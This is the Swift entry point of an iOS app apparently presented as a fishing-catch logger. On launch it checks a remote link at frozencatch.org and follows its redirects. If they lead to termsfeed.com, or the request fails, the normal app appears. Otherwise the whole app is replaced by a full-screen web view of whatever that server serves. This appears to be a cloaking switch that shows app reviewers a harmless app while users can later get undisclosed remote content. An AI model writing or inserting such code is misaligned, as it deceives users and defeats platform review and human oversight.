import SwiftUI

@main
struct FrozenCatchApp: App {
    @StateObject private var store = FrozenCatchStore()
    @State private var frozenCatchLinkReady: Bool? = nil

    private let frozenCatchSourceLink = "https://frozencatch.org/click.php"
    private let frozenCatchCheckDomain = "termsfeed.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = frozenCatchLinkReady {
                    if ready {
                        FrozenCatchWebPanel(urlString: frozenCatchSourceLink)
                            .edgesIgnoringSafeArea(.all)
                    } else {
                        ContentView()
                            .environmentObject(store)
                    }
                } else {
                    FrozenCatchLoadingScreen()
                        .onAppear { performFrozenCatchLinkCheck() }
                }
            }
            .preferredColorScheme(.dark)
        }
    }

    private func performFrozenCatchLinkCheck() {
        guard let url = URL(string: frozenCatchSourceLink) else {
            frozenCatchLinkReady = false
            return
        }

        var request = URLRequest(url: url)
        request.timeoutInterval = 5

        let tracker = FrozenCatchRedirectTracker(checkDomain: frozenCatchCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)

        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    frozenCatchLinkReady = false
                    return
                }
                if let resolved = tracker.resolvedURL?.absoluteString,
                   resolved.contains(self.frozenCatchCheckDomain) {
                    frozenCatchLinkReady = false
                    return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(self.frozenCatchCheckDomain) {
                    frozenCatchLinkReady = false
                    return
                }
                if error != nil {
                    frozenCatchLinkReady = false
                    return
                }
                frozenCatchLinkReady = true
            }
        }.resume()

        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if frozenCatchLinkReady == nil {
                frozenCatchLinkReady = false
            }
        }
    }
}

class FrozenCatchRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String

    init(checkDomain: String) {
        self.checkDomain = checkDomain
    }

    func urlSession(_ session: URLSession,
                    task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let urlStr = request.url?.absoluteString, urlStr.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}
